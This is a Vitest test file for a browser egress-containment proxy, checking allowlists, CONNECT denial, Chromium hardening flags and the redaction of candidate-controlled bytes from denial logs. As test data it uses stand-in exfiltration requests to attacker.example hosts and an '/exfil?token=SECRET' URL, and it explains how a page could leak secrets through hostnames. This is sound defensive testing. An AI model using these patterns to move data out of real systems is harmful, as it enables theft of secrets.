// @vitest-environment node
import { spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import http from "node:http";
import net from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  BROWSER_EGRESS_PROXY_ENV,
  EGRESS_CHROMIUM_ARGS,
  EGRESS_CONTEXT_OPTIONS,
  browserEgressLaunchOptions,
  buildEgressAllowlist,
  createEgressProxy,
  parseEgressDenialLog,
  startEgressProxy,
} from "./browserEgressContainment.mjs";
import { EGRESS_PROOF_CHANNELS } from "./browserEgressChannels.mjs";
import { verifyEgressProofEvidence } from "./browserEgressProofVerify.mjs";

const PK = "pk_test_ZXhhbXBsZS5jbGVyay5hY2NvdW50cy5kZXYk"; // example.clerk.accounts.dev
const CONVEX = "https://happy-animal-123.convex.cloud";

describe("buildEgressAllowlist", () => {
  it("allows exactly the candidate, the Convex preview and the Clerk test Frontend API", () => {
    expect(
      buildEgressAllowlist({ convexUrl: CONVEX, clerkPublishableKey: PK }),
    ).toEqual([
      "127.0.0.1:3000",
      "example.clerk.accounts.dev:443",
      "happy-animal-123.convex.cloud:443",
      "localhost:3000",
    ]);
  });

  it.each([
    ["a non-convex host", "https://evil.example.com"],
    ["a convex suffix trick", "https://x.convex.cloud.evil.example.com"],
    ["plain http", "http://happy-animal-123.convex.cloud"],
    ["a missing url", undefined],
  ])("refuses %s as the Convex deployment", (_label, convexUrl) => {
    expect(() =>
      buildEgressAllowlist({ convexUrl, clerkPublishableKey: PK }),
    ).toThrow();
  });

  it("refuses a live Clerk key and non-exact extra entries", () => {
    expect(() =>
      buildEgressAllowlist({ convexUrl: CONVEX, clerkPublishableKey: "pk_live_Zm9v" }),
    ).toThrow();
    for (const extra of ["*.evil.com:443", "10.0.0.1:443", "127.0.0.1:8080", "evil.com"]) {
      expect(() =>
        buildEgressAllowlist({ convexUrl: CONVEX, clerkPublishableKey: PK, extra: [extra] }),
      ).toThrow();
    }
  });
});

describe("browserEgressLaunchOptions", () => {
  it("is undefined when containment is not requested", () => {
    expect(browserEgressLaunchOptions({})).toBeUndefined();
  });

  it("fails closed when required but the proxy is missing", () => {
    expect(() => browserEgressLaunchOptions({ BROWSER_EGRESS_REQUIRED: "1" })).toThrow(/open egress/);
  });

  it("only accepts the loopback proxy and carries the Chromium hardening flags", () => {
    const options = browserEgressLaunchOptions({ [BROWSER_EGRESS_PROXY_ENV]: "http://127.0.0.1:3129" });
    expect(options?.proxy.server).toBe("http://127.0.0.1:3129");
    expect(options?.args).toEqual([...EGRESS_CHROMIUM_ARGS]);
    expect(options?.args.join(" ")).toContain("disable_non_proxied_udp");
    expect(options?.args.join(" ")).toContain("--disable-quic");
    expect(options?.args.join(" ")).toContain("MAP * ~NOTFOUND");
    for (const bad of ["http://evil.example:3129", "https://127.0.0.1:3129", "http://127.0.0.1", "http://u:p@127.0.0.1:3129"]) {
      expect(() => browserEgressLaunchOptions({ [BROWSER_EGRESS_PROXY_ENV]: bad })).toThrow();
    }
  });

  it("blocks service workers on every context", () => {
    expect(EGRESS_CONTEXT_OPTIONS.serviceWorkers).toBe("block");
  });
});

async function listen(server: http.Server | net.Server, host = "127.0.0.1"): Promise<number> {
  await new Promise<void>((resolve) => server.listen(0, host, resolve));
  return (server.address() as net.AddressInfo).port;
}

describe("egress proxy semantics", () => {
  const upstream = http.createServer((_req, res) => res.end("candidate-ok"));
  let upstreamPort = 0;
  let proxy: Awaited<ReturnType<typeof startEgressProxy>>;

  beforeAll(async () => {
    upstreamPort = await listen(upstream);
    proxy = await startEgressProxy({ allow: [`127.0.0.1:${upstreamPort}`], port: 0 });
  });
  afterAll(() => {
    proxy.stop();
    upstream.close();
  });

  function viaProxy(target: string): Promise<{ status: number; body: string }> {
    const url = new URL(target);
    return new Promise((resolve, reject) => {
      const req = http.request(
        { host: "127.0.0.1", port: proxy.port, method: "GET", path: target, headers: { host: url.host } },
        (res) => {
          let body = "";
          res.on("data", (chunk) => (body += chunk));
          res.on("end", () => resolve({ status: res.statusCode ?? 0, body }));
        },
      );
      req.on("error", reject);
      req.end();
    });
  }

  function connectVia(authority: string): Promise<string> {
    return new Promise((resolve) => {
      const socket = net.connect(proxy.port, "127.0.0.1", () => {
        socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`);
      });
      socket.once("data", (chunk) => {
        resolve(chunk.toString().split("\r\n")[0]);
        socket.destroy();
      });
      socket.on("error", () => resolve("error"));
    });
  }

  it("forwards an allowlisted absolute-form request", async () => {
    expect(await viaProxy(`http://127.0.0.1:${upstreamPort}/x`)).toEqual({ status: 200, body: "candidate-ok" });
  });

  it("denies and records a non-allowlisted request without logging its path or query", async () => {
    const before = proxy.denied.length;
    const result = await viaProxy("http://127.0.0.2:9/exfil?token=SECRET");
    expect(result.status).toBe(403);
    const recorded = proxy.denied.slice(before).join("\n");
    // G4-01: only a fixed reason code is recorded. The method, host and port of
    // a denied request are candidate-controlled bytes and must never be logged.
    expect(recorded).toBe("egress-denied not-allowlisted-loopback");
    expect(recorded).not.toContain("127.0.0.2");
    expect(recorded).not.toContain("GET");
    expect(recorded).not.toContain("SECRET");
    expect(recorded).not.toContain("exfil");
  });

  it("denies CONNECT to anything not allowlisted, including the proxy itself", async () => {
    expect(await connectVia("example.com:443")).toContain("403");
    expect(await connectVia(`127.0.0.1:${proxy.port}`)).toContain("403");
    expect(await connectVia("127.0.0.1:1")).toContain("403");
  });

  it("allows CONNECT to an allowlisted authority", async () => {
    expect(await connectVia(`127.0.0.1:${upstreamPort}`)).toContain("200");
  });

  it("denies non-absolute-form requests and plain upgrades", async () => {
    const raw = await new Promise<string>((resolve) => {
      const socket = net.connect(proxy.port, "127.0.0.1", () =>
        socket.write("GET /direct HTTP/1.1\r\nHost: x\r\n\r\n"),
      );
      socket.once("data", (chunk) => {
        resolve(chunk.toString().split("\r\n")[0]);
        socket.destroy();
      });
    });
    expect(raw).toContain("403");
  });
});

describe("createEgressProxy resolution safety", () => {
  it("never dials a private address for an allowlisted non-loopback name", async () => {
    // localhost is the only loopback alias; an allowlisted *name* that resolves
    // to a private address must be refused, not dialled.
    const { server, denied, stop } = createEgressProxy({ allow: ["metadata.invalid:80"] });
    const port = await listen(server);
    const status = await new Promise<number>((resolve) => {
      const req = http.request(
        { host: "127.0.0.1", port, path: "http://metadata.invalid/", headers: { host: "metadata.invalid" } },
        (res) => resolve(res.statusCode ?? 0),
      );
      req.on("error", () => resolve(-1));
      req.end();
    });
    expect(status).toBe(502);
    expect(denied.join("\n")).toContain("unresolvable-or-private");
    expect(denied.join("\n")).not.toContain("metadata.invalid");
    stop();
  });
});

describe("verifyEgressProofEvidence and parseEgressDenialLog (G4-02)", () => {
  const good = () => ({
    ok: true,
    failures: [],
    collector: { tcpEvents: 0, udpPackets: 0 },
    allowedStatus: 200,
    topLevelNavigation: "response:403",
    channels: Object.fromEntries(Object.entries(EGRESS_PROOF_CHANNELS).map(([name, accepted]) => [name, accepted[0]])),
    proxyDenials: { "not-allowlisted-loopback": 9, "not-allowlisted": 2, unrecognized: 0 },
  });

  const omit = (record: Record<string, string>, key: string) =>
    Object.fromEntries(Object.entries(record).filter(([name]) => name !== key));

  it("accepts a complete passing proof", () => {
    expect(verifyEgressProofEvidence(good())).toEqual([]);
  });

  it("the mandatory channel list is exactly the set of attacks the proof page attempts (G4R2-02)", () => {
    const source = readFileSync(path.join(__dirname, "browserEgressProof.mjs"), "utf8");
    const attempted = [...source.matchAll(/attempt\("([^"]+)"/g)].map((match) => match[1]);
    expect(new Set(attempted).size).toBe(attempted.length);
    expect([...attempted].sort()).toEqual(Object.keys(EGRESS_PROOF_CHANNELS).sort());
  });

  it.each<[string, unknown]>([
    ["non-object evidence", null],
    ["ok false", { ...good(), ok: false }],
    ["ok missing", { ...good(), ok: undefined }],
    ["a failure listed", { ...good(), failures: ["x"] }],
    ["tcp collector traffic", { ...good(), collector: { tcpEvents: 1, udpPackets: 0 } }],
    ["udp collector traffic", { ...good(), collector: { tcpEvents: 0, udpPackets: 1 } }],
    ["collector counts missing", { ...good(), collector: undefined }],
    ["allowlisted origin not 200", { ...good(), allowedStatus: 502 }],
    ["service worker registered", { ...good(), channels: { ...good().channels, "service-worker": "REGISTERED" } }],
    ["every channel missing but the service worker", { ...good(), channels: { "service-worker": "blocked" } }],
    ["channels missing", { ...good(), channels: undefined }],
    ["an unlisted channel", { ...good(), channels: { ...good().channels, extra: "done" } }],
    ["navigation missing", { ...good(), topLevelNavigation: undefined }],
    ["navigation not refused", { ...good(), topLevelNavigation: "response:200" }],
    ["navigation not-run", { ...good(), topLevelNavigation: "not-run" }],
    ...Object.keys(EGRESS_PROOF_CHANNELS).flatMap((name): [string, unknown][] => [
      [`channel ${name} missing`, { ...good(), channels: omit(good().channels, name) }],
      [`channel ${name} unavailable`, { ...good(), channels: { ...good().channels, [name]: "unavailable" } }],
    ]),
    ["websocket opened", { ...good(), channels: { ...good().channels, websocket: "open" } }],
    ["proxyDenials missing", { ...good(), proxyDenials: undefined }],
    ["no loopback probe denial", { ...good(), proxyDenials: { "not-allowlisted": 4, unrecognized: 0 } }],
    ["unrecognized log lines", { ...good(), proxyDenials: { "not-allowlisted-loopback": 1, unrecognized: 1 } }],
    ["a reason outside the vocabulary", { ...good(), proxyDenials: { "not-allowlisted-loopback": 1, "evil.example:443": 1 } }],
  ])("rejects %s", (_label, evidence) => {
    expect(verifyEgressProofEvidence(evidence).length).toBeGreaterThan(0);
  });

  it("CLI exits non-zero for missing, empty, failing and passing-with-no-evidence files, zero for a full pass", () => {
    const dir = mkdtempSync(path.join(tmpdir(), "egress-verify-"));
    const run = (name: string, body: string | null) => {
      const file = path.join(dir, name);
      if (body !== null) writeFileSync(file, body);
      return spawnSync(process.execPath, [path.join(__dirname, "browserEgressProofVerify.mjs"), file], {
        encoding: "utf8",
      });
    };
    try {
      expect(run("missing.json", null).status).toBe(1);
      expect(run("empty.json", "").status).toBe(1);
      expect(run("fail.json", JSON.stringify({ ...good(), ok: false })).status).toBe(1);
      expect(run("bare-ok.json", JSON.stringify({ ok: true })).status).toBe(1);
      const pass = run("pass.json", JSON.stringify(good()));
      expect(pass.status).toBe(0);
      expect(pass.stdout).toContain("verified");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("counts denials by fixed reason and flags anything else, including the old raw format", () => {
    const parsed = parseEgressDenialLog(
      [
        "egress-allowlist 127.0.0.1:3000 localhost:3000",
        "egress-proxy-listening 127.0.0.1:3129",
        "egress-denied not-allowlisted-loopback",
        "egress-denied not-allowlisted-loopback",
        "egress-denied not-allowlisted",
        "egress-denied GET 127.0.0.2:9 not-allowlisted",
        "something else",
        "",
      ].join("\n"),
    );
    expect(parsed).toEqual({
      denials: { "not-allowlisted-loopback": 2, "not-allowlisted": 1 },
      unrecognized: 2,
    });
  });
});

// G4-01 (SCRUM-350 / SCRUM-784): the proxy log is uploaded as a workflow
// artifact from a public repository. Candidate page code can encode QA
// authority into the host labels or method of a request it knows will be
// denied, so nothing candidate-controlled may reach the log.
describe("egress proxy log carries only fixed reason codes (G4-01)", () => {
  const MARKER = "sEcReTmArKeR9f3a";
  const upstream = http.createServer((_req, res) => res.end("candidate-ok"));
  const logged: string[] = [];
  let proxy: Awaited<ReturnType<typeof startEgressProxy>>;
  let upstreamPort = 0;

  beforeAll(async () => {
    upstreamPort = await listen(upstream);
    proxy = await startEgressProxy({
      allow: [`127.0.0.1:${upstreamPort}`],
      port: 0,
      log: (line) => logged.push(line),
    });
  });
  afterAll(() => {
    proxy.stop();
    upstream.close();
  });

  function request(method: string, target: string): Promise<number> {
    const url = new URL(target);
    return new Promise((resolve) => {
      const req = http.request(
        { host: "127.0.0.1", port: proxy.port, method, path: target, headers: { host: url.host } },
        (res) => {
          res.resume();
          res.on("end", () => resolve(res.statusCode ?? 0));
        },
      );
      req.on("error", () => resolve(-1));
      req.end();
    });
  }

  function connectTo(authority: string): Promise<void> {
    return new Promise((resolve) => {
      const socket = net.connect(proxy.port, "127.0.0.1", () =>
        socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`),
      );
      socket.once("data", () => {
        socket.destroy();
        resolve();
      });
      socket.on("error", () => resolve());
    });
  }

  it("never logs a marker carried in the hostname, method, path, query or CONNECT authority", async () => {
    const start = logged.length;
    expect(await request("GET", `http://${MARKER}.attacker.example/${MARKER}?q=${MARKER}`)).toBe(403);
    expect(await request("PURGE", `http://${MARKER}.attacker.example:8443/p`)).toBe(403);
    expect(await request("GET", `http://127.0.0.2:9/${MARKER}?token=${MARKER}`)).toBe(403);
    await connectTo(`${MARKER}.attacker.example:443`);
    await connectTo(`${MARKER}-b.attacker.example:8443`);

    const lines = logged.slice(start);
    const everything = [...lines, ...proxy.denied].join("\n").toLowerCase();
    expect(lines.length).toBeGreaterThanOrEqual(5);
    expect(everything).not.toContain(MARKER.toLowerCase());
    expect(everything).not.toContain("attacker");
    expect(everything).not.toContain("purge");
    expect(everything).not.toContain("127.0.0.2");
    for (const line of lines) {
      expect(line).toMatch(/^egress-denied (not-allowlisted|not-allowlisted-loopback)$/);
    }
  });

  it("bounds memory and log growth: lines and the denied array stop at the cap, totals stay exact (G4R2-01)", async () => {
    const lines: string[] = [];
    const small = createEgressProxy({ allow: ["127.0.0.1:1"], log: (line) => lines.push(line), maxRecorded: 3 });
    const port = await listen(small.server);
    for (let i = 0; i < 10; i++) {
      await new Promise<void>((resolve) => {
        const req = http.request(
          { host: "127.0.0.1", port, path: "http://127.0.0.2:9/x", headers: { host: "127.0.0.2:9" } },
          (res) => {
            res.resume();
            res.on("end", () => resolve());
          },
        );
        req.on("error", () => resolve());
        req.end();
      });
    }
    small.stop();
    expect(small.denied).toHaveLength(3);
    expect(lines).toEqual([
      "egress-denied not-allowlisted-loopback",
      "egress-denied not-allowlisted-loopback",
      "egress-denied not-allowlisted-loopback",
      "egress-log-truncated",
    ]);
    expect(small.counts).toEqual({ "not-allowlisted-loopback": 10 });
    expect(small.stats()).toEqual({ denied: 10, permitted: 0 });
    expect(parseEgressDenialLog(lines.join("\n"))).toEqual({
      denials: { "not-allowlisted-loopback": 3 },
      unrecognized: 0,
    });
  });

  it("control: the denial itself is still evidenced by a fixed reason code", async () => {
    const start = logged.length;
    await request("GET", "http://127.0.0.2:9/x");
    await request("GET", `http://${MARKER}.attacker.example/x`);
    expect(logged.slice(start)).toEqual([
      "egress-denied not-allowlisted-loopback",
      "egress-denied not-allowlisted",
    ]);
  });
});
